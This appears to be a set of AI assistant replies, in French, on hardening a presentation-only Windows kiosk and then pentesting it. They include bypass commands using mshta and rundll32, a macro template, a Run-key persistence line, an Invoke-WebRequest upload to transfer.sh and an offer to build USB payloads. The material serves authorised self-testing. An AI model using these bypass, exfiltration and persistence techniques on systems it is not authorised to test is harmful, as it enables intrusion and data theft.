@@ -1,0 +1,417 @@
+Très bon réflexe de vouloir à la fois durcir et tester ce poste dédié à un usage très restreint (présentation uniquement). Voici une réponse en deux temps : (1) les mesures de durcissement maximales, puis (2) les pistes pour le pentest.
+
+⸻
+
+🔐 1. Suggestions de durcissement extrême
+
+Objectif : poste quasiment kiosqué, ultra-limité, impossible à détourner.
+
+✅ Système d’exploitation et configuration
+	•	Mode Kiosque / Assigned Access (sur Windows) : ne lancer qu’une seule app (ex: PowerPoint, ou PDF viewer).
+	•	Compte local avec droits minimum (aucun droit admin).
+	•	Suppression ou désactivation de PowerShell, CMD, Regedit, WScript, cscript, etc.
+	•	Désactivation de l’UAC, ou réglée à son niveau le plus restrictif.
+	•	Applocker ou WDAC : pour bloquer tout exécutable non autorisé.
+	•	BitLocker activé si le disque contient des documents, même limités.
+
+🔒 Réseau et périphériques
+	•	Pas d’accès Internet (filtrage par pare-feu ou absence de passerelle).
+	•	Désactivation de toutes interfaces réseau non nécessaires (WiFi, Bluetooth, Ethernet si non utile).
+	•	Désactivation des ports USB : via BIOS/UEFI ou GPO.
+	•	Ou usage de USBGuard (sous Linux).
+	•	Ou USB en lecture seule uniquement (si besoin pour charger un PDF).
+	•	BIOS/UEFI protégé par mot de passe, Secure Boot activé.
+
+📦 Système de fichiers et sécurité
+	•	Suppression des outils inutiles / nettoyage du système.
+	•	Lecture seule sur les dossiers utilisateurs / AppData si possible.
+	•	Pas de stockage local : tout se lit depuis un réseau en lecture seule ou clé USB validée.
+	•	Désactivation du presse-papiers partagé (utile en virtualisation).
+	•	Désactivation de la mise à jour automatique, ou contrôle via WSUS.
+
+🎯 Autres protections
+	•	Antivirus/EDR très restrictif.
+	•	Événements journaux activés (audits de lancement de processus, accès fichiers, USB, etc.).
+	•	Blocage de toutes les notifications, mises à jour et pop-ups intempestives.
+	•	Verrouillage automatique par GPO après X min, session fermée automatiquement.
+
+⸻
+
+🧪 2. Pentest / test d’intrusion ciblé
+
+But : essayer de détourner les restrictions, accéder à des outils interdits, ou élever les privilèges.
+
+🔍 À tester (manuellement ou via scripts d’audit)
+
+▶️ Exécution d’exécutables
+	•	Peut-on lancer .exe depuis une clé USB ?
+	•	Peut-on contourner via : script .vbs, .ps1, .bat, .hta, .lnk ?
+	•	Peut-on renommer un .exe en .jpg puis le relancer ?
+
+🧰 Commandes systèmes / Shell
+	•	CMD, PowerShell, WSL, Regedit bloqués ?
+	•	Peut-on lancer des commandes via d’autres outils (Word avec macro, fichiers .scf, Paint + OLE, etc.) ?
+
+🔓 Élévation de privilèges
+	•	Utilisateur standard peut-il faire des changements ?
+	•	UAC désactivé ou contournable ?
+	•	Accès à des outils comme runas, schtasks, taskmgr, etc. ?
+
+📤 Exfiltration / transfert de fichiers
+	•	Peut-on lire un fichier confidentiel ?
+	•	Peut-on uploader un fichier sur Internet (ex : vers transfer.sh, imgur, etc.) ?
+	•	Peut-on envoyer un mail depuis le poste ? Via Outlook, ou autre ?
+
+🧿 Interface physique
+	•	Que se passe-t-il si on branche :
+	•	Une clé USB (stockage, HID, Rubber Ducky, USB Killer) ?
+	•	Une carte réseau USB ?
+	•	Un smartphone en mode modem USB ?
+
+🐛 Persistance
+	•	Peut-on créer un script de démarrage ?
+	•	Planifier une tâche ?
+	•	Écrire dans les clefs de registre Run ou RunOnce ?
+
+🖼️ Virtualisation / Forensic
+	•	Poste dans une VM ? Peut-on échapper au sandbox ?
+	•	Peut-on modifier la mémoire, injecter du code dans un processus ?
+
+⸻
+
+🎁 Bonus : outils utiles pour le test
+	•	🛠️ Sysinternals Suite : Process Explorer, Autoruns, AccessChk, TCPView.
+	•	🔍 Seatbelt ou SharpUp : outils de post-exploitation pour vérifier la surface d’attaque.
+	•	🧰 PowerUp, WinPEAS, WinPrivChecker : pour tester les élévations de privilèges.
+	•	🐛 Rubber Ducky / Bash Bunny (si tu as le matériel) pour tester l’impact physique.
+	•	📄 Word avec macro malveillante ou PDF piégé pour test d’ingénierie sociale.
+
+⸻
+
+Souhaites-tu une checklist PDF ou tableau Excel pour suivre les tests / durcissements ?
+
+
+Parfait, on passe en mode pentest local sur un poste durci. Voici des actions concrètes, commandes, et ce qu’elles permettent de vérifier, organisées par objectif. Ce sont des tests réalistes que tu peux mener toi-même en local et sans outils offensifs avancés, parfait pour une évaluation sur site.
+
+⸻
+
+🧪 1. Exécution bloquée ? Teste les contournements
+
+▶️ Basique
+
+calc
+notepad
+cmd
+powershell
+
+➜ Vérifie si tu peux exécuter un exécutable standard.
+
+▶️ Depuis un support amovible (clé USB)
+	•	Copie un notepad.exe renommé (ex: test.jpg) sur la clé.
+	•	Lance-le depuis l’explorateur.
+
+▶️ En script
+
+echo Hello > test.bat
+test.bat
+
+Write-Output "Test OK"
+
+➜ Si l’exécution est bloquée par Applocker/WDAC, tu verras un message.
+
+⸻
+
+🔍 2. Contourner les restrictions via outils système
+
+Teste les outils “détournables”
+
+mshta vbscript:msgbox("Hello")
+
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Hello');
+
+Word avec macro
+	1.	Crée un .docm avec une macro :
+
+Sub AutoOpen()
+    MsgBox "Macro lancée"
+End Sub
+
+	2.	Ouvre le fichier sur le poste.
+
+➜ Vérifie si les macros sont bloquées.
+
+⸻
+
+🧰 3. Environnement et droits utilisateur
+
+Quel utilisateur suis-je ?
+
+whoami
+
+Suis-je admin ?
+
+net localgroup administrators
+
+Quels droits ai-je ?
+
+whoami /priv
+
+➜ Cherche SeDebugPrivilege, SeShutdownPrivilege, etc.
+
+Où suis-je ?
+
+hostname
+echo %USERNAME%
+echo %USERDOMAIN%
+
+
+⸻
+
+🔑 4. Peut-on faire de l’élévation de privilège ?
+
+Liste des tâches planifiées
+
+schtasks /query /fo LIST /v
+
+➜ Tâches avec droits SYSTEM que tu peux modifier ?
+
+Ouvre le Task Manager → “Ouvrir un nouveau processus” (Ctrl+Shift+Esc)
+
+➜ Peut-on lancer CMD en SYSTEM depuis là ?
+
+⸻
+
+📤 5. Test d’exfiltration / communication réseau
+
+Test Internet
+
+ping google.com
+curl https://example.com
+
+Upload possible ?
+
+Invoke-WebRequest -Uri "https://transfer.sh" -Method POST -InFile "test.txt"
+
+➜ S’il y a un proxy ou pas de route, ça échouera.
+
+⸻
+
+💾 6. USB et stockage
+	1.	Branche une clé USB avec un .exe, un .bat, un .vbs.
+	2.	Essaie d’exécuter les fichiers.
+	3.	Tente de copier un fichier depuis le poste vers la clé.
+
+➜ Vérifie si le port USB est bloqué / lecture seule.
+
+⸻
+
+🔒 7. Accès à des outils système interdits
+
+Teste depuis Win + R ou dans une invite :
+
+regedit
+taskmgr
+eventvwr
+services.msc
+mmc
+
+➜ Interdit par GPO ?
+
+⸻
+
+🕵️ 8. Inspection de la sécurité du système
+
+Affiche les politiques en place
+
+gpresult /h gp.html
+start gp.html
+
+Vérifie les règles Applocker
+
+Get-AppLockerPolicy -Effective -Xml
+
+➜ Tu peux les analyser pour voir si certains chemins ou types de fichiers sont mal protégés.
+
+⸻
+
+🧠 9. Test “social engineering” local
+	•	Place un fichier rapport_paie_2024.xls avec macro malveillante.
+	•	Nom d’un PDF : accès_wifi_mission.pdf
+	•	Lance une fausse application (document.exe) renommée en .pdf
+
+➜ Vois si un utilisateur peut être incité à l’ouvrir malgré les protections.
+
+⸻
+
+🧿 10. Persistence
+
+Teste si tu peux :
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MonTest /t REG_SZ /d "notepad.exe"
+
+➜ Si autorisé, l’exécution est trop permissive.
+
+⸻
+
+Bonus : Si tu veux aller plus loin
+
+Tu peux aussi :
+	•	Lancer WinPEAS (pas offensif, mais audit complet local)
+	•	Importer Seatbelt.exe pour un inventaire de sécurité
+	•	Utiliser Autoruns (Sysinternals) pour voir les points de persistence actifs
+
+⸻
+
+Souhaites-tu que je t’en fasse un script de test automatisé (batch ou PowerShell), ou une checklist papier à remplir pendant le pentest ?
+
+Parfait, on va sortir du simple diagnostic pour passer en mode vrai pentest local, même si tu es en environnement restreint. Voici ce que tu peux faire concrètement, étape par étape, comme un pentesteur en boîte noire (ou presque), avec des objectifs clairs, des techniques offensives adaptées à un poste durci, et les résultats attendus.
+
+⸻
+
+🔐🎯 Objectif global du pentest local
+
+Montrer que tu peux contourner les restrictions du poste, accéder à des fonctions interdites, exfiltrer des données, ou persister sur la machine malgré les protections mises en place.
+
+⸻
+
+🧭 Étapes concrètes à mener
+
+⸻
+
+1. Reconnaissance locale
+
+But : connaître ton terrain avant de tenter quoi que ce soit.
+
+🔸 Ce que tu fais :
+	•	Ouvre un terminal (si autorisé) ou passe par Exécuter (Win+R), Task Manager, Word, etc.
+	•	Collecte les infos de base : utilisateur, droits, services, applis installées, sécurité active.
+
+🔸 Objectifs :
+	•	Savoir si tu es admin ou utilisateur restreint.
+	•	Savoir si des antivirus ou restrictions GPO sont en place.
+	•	Repérer les failles dans la conf (services exposés, ports ouverts, tâches planifiées…)
+
+⸻
+
+2. Test de contournement des restrictions
+
+But : exécuter ce qui ne devrait pas pouvoir être exécuté.
+
+🔸 Ce que tu fais :
+	•	Apporte une clé USB avec plusieurs payloads :
+	•	test.bat, macro.docm, test.exe, document.pdf.exe, mshta.vbs
+	•	Essaie de les lancer directement, ou en passant par :
+	•	Word (macro), Explorateur Windows (double-clic), Win+R, Task Manager → “Nouveau processus”
+
+🔸 Objectifs :
+	•	Savoir si le système bloque vraiment l’exécution.
+	•	Tester les failles courantes (extension masquée .pdf.exe, HTA, scripts VBS, etc.)
+
+⸻
+
+3. Test d’élévation de privilèges
+
+But : tenter de devenir admin ou SYSTEM
+
+🔸 Ce que tu fais :
+	•	Liste les tâches planifiées ou services modifiables
+	•	Vérifie si tu peux écrire dans certains dossiers systèmes
+	•	Lance des binaires dans des contextes élevés (ex. notepad via une tâche SYSTEM mal configurée)
+
+🔸 Objectifs :
+	•	Trouver un binaire mal protégé.
+	•	Exploiter une tâche ou un service pour injecter du code.
+
+⸻
+
+4. Test de persistance
+
+But : s’assurer qu’une fois entré, tu peux rester
+
+🔸 Ce que tu fais :
+	•	Essaie de te faire relancer à chaque démarrage :
+	•	Clé de registre HKCU\Run
+	•	Script de logon (s’il existe)
+	•	Tâche planifiée en tant que toi-même
+
+🔸 Objectifs :
+	•	Démontrer que la session utilisateur peut être utilisée comme point d’ancrage.
+	•	Voir si les fichiers que tu déposes persistent après redémarrage.
+
+⸻
+
+5. Test d’exfiltration de données
+
+But : prouver que tu peux sortir des infos du poste
+
+🔸 Ce que tu fais :
+	•	Essaie de :
+	•	Uploader un fichier via curl ou Invoke-WebRequest
+	•	Envoyer un mail via un script PowerShell
+	•	Lire un fichier local et le copier sur ta clé USB
+
+🔸 Objectifs :
+	•	Savoir si les restrictions réseau ou USB sont efficaces
+	•	Prouver la faille en récupérant un fichier “confidentiel” sur ta machine externe
+
+⸻
+
+6. Test d’injection ou d’abus d’application
+
+But : utiliser une appli autorisée comme vecteur d’attaque
+
+🔸 Ce que tu fais :
+	•	Ouvre PowerPoint ou PDF Reader
+	•	Insère un lien vers une URL malveillante (ms-msdt:/, file://, etc.)
+	•	Lance un fichier OLE piégé depuis Word (ex: Excel embedded)
+
+🔸 Objectifs :
+	•	Prouver que même un usage “autorisé” peut être détourné
+	•	Tester les protections contre l’ingénierie sociale et les liens internes
+
+⸻
+
+7. Test d’attaque physique
+
+But : tester ce qui se passe si un agent malveillant est physiquement devant le poste
+
+🔸 Ce que tu fais :
+	•	Branche :
+	•	Une clé USB type Rubber Ducky (script HID : tape une séquence)
+	•	Un USB Ethernet (permet d’injecter une nouvelle interface)
+	•	Un smartphone en mode modem USB
+	•	Observe le comportement du système :
+	•	Nouvelle interface réseau créée ?
+	•	Lancement automatique de fichiers ?
+
+🔸 Objectifs :
+	•	Prouver qu’un port USB non désactivé est une faille majeure.
+	•	Tester l’impact d’un “attaquant interne discret”.
+
+⸻
+
+8. Bypass par app autorisée
+
+But : utiliser une app autorisée pour faire des choses interdites
+
+🔸 Ce que tu fais :
+	•	Depuis PowerPoint → lien vers cmd.exe
+	•	Depuis Excel → Macro qui lance un script
+	•	Depuis Word → insère un ActiveX
+
+🔸 Objectifs :
+	•	Prouver qu’aucune app n’est 100% safe si elle exécute du code.
+
+⸻
+
+✅ À la fin, documente :
+	•	Les failles découvertes
+	•	Les moyens concrets de les exploiter
+	•	Les recommandations de remédiation
+
+⸻
+
+Souhaites-tu maintenant :
+	•	Un rapport de pentest type (squelette en .docx ou Markdown) ?
+	•	Un script d’attaque locale automatisée (genre audit.bat) ?
+	•	Ou un jeu de fichiers USB (payloads) pour tester les exécutions ?
